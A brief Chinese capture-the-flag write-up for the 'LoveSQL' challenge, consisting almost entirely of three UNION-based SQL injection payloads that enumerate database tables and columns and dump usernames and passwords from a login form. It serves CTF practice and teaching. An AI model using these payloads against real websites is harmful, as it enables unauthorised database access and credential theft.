# [极客大挑战 2019]LoveSQL

## 知识点

`sql注入`

`联合注入`

## 解题

```sql
?username=1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
?username=1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name="l0ve1ysq1"%23&password=1
?username=1'union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1
```